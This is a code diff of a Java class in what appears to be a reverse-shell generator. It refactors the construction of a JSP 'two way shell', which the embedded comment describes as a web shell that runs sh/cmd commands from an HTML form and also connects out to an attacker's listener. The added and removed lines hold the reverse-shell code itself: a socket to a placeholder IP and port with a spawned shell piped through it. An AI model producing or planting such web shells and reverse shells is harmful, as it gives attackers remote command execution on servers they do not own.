@@ -8,7 +8,20 @@ public class Java_two_way extends Reverse {
 
     public Java_two_way(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("<%\r\n" + //
+        shellFormat = String.format(
+                "    try {\r\n" + //
+                "        Socket socket = new Socket( \"255.10.10.10\", 9001 ); // Replace with wanted ip and port\r\n" + //
+                "        Process process = Runtime.getRuntime().exec( shellPath );\r\n" + //
+                "        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r\n" + //
+                "        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r\n" + //
+                "        out.println(\"port opened on \" + socket);\r\n" + //
+                "     } catch( Exception e ) {}\r\n" + //
+                "");
+    }
+
+    @Override
+    public String getShellCode(){
+        return "<%\r\n" + //
                 "    /*\r\n" + //
                 "     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\r\n" + //
                 "     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\r\n" + //
@@ -96,22 +109,11 @@ public class Java_two_way extends Reverse {
                 "        }\r\n" + //
                 "    }\r\n" + //
                 " \r\n" + //
-                "    try {\r\n" + //
-                "        Socket socket = new Socket( \"255.10.10.10\", 9001 ); // Replace with wanted ip and port\r\n" + //
-                "        Process process = Runtime.getRuntime().exec( shellPath );\r\n" + //
-                "        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r\n" + //
-                "        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r\n" + //
-                "        out.println(\"port opened on \" + socket);\r\n" + //
-                "     } catch( Exception e ) {}\r\n" + //
+                shellFormat +
                 "%>\r\n" + //
                 "</pre>\r\n" + //
                 "</body>\r\n" + //
-                "</html>", this.getLocalIP(), this.getLocalPort());
-    }
-
-    @Override
-    public String getShellCode(){
-        return shellFormat;
+                "</html>";
     }
 
     @Override
